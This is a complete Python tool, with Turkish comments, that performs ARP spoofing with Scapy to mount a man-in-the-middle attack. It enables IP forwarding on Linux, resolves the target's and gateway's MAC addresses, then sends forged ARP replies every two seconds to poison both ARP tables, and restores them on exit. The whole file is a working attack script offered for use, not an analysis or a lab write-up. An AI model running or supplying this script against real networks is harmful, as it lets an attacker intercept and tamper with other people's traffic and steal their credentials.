#!/usr/bin/env python3
"""
Advanced ARP Spoofer
====================
Scapy kullanarak Ortadaki Adam (MitM) saldırısı gerçekleştirir.
Gereksinim: pip install scapy
"""
import sys
import time
import os
try:
    import scapy.all as scapy
except ImportError:
    print("[-] Lütfen 'scapy' kütüphanesini yükleyin: pip install scapy")
    sys.exit(1)

def enable_ip_forwarding():
    """Linux üzerinde IP yönlendirmeyi etkinleştirir."""
    if os.name == 'posix':
        print("[*] IP Yönlendirme (IP Forwarding) etkinleştiriliyor...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    """Linux üzerinde IP yönlendirmeyi kapatır."""
    if os.name == 'posix':
        print("[*] IP Yönlendirme kapatılıyor...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python ARP_Spoofer.py <HEDEF_IP> <GATEWAY_IP>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac:
        print(f"[-] Hedef MAC adresi bulunamadı: {target_ip}. Ağa bağlı olduğundan emin olun.")
        sys.exit(1)
    if not gateway_mac:
        print(f"[-] Gateway MAC adresi bulunamadı: {gateway_ip}.")
        sys.exit(1)

    enable_ip_forwarding()

    try:
        sent_packets_count = 0
        print(f"[*] {target_ip} ve {gateway_ip} zehirleniyor... (Çıkış için CTRL+C)")
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            sent_packets_count += 2
            print(f"\r[*] Gönderilen Paket: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Çıkış yapılıyor. ARP tabloları düzeltiliyor...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        disable_ip_forwarding()
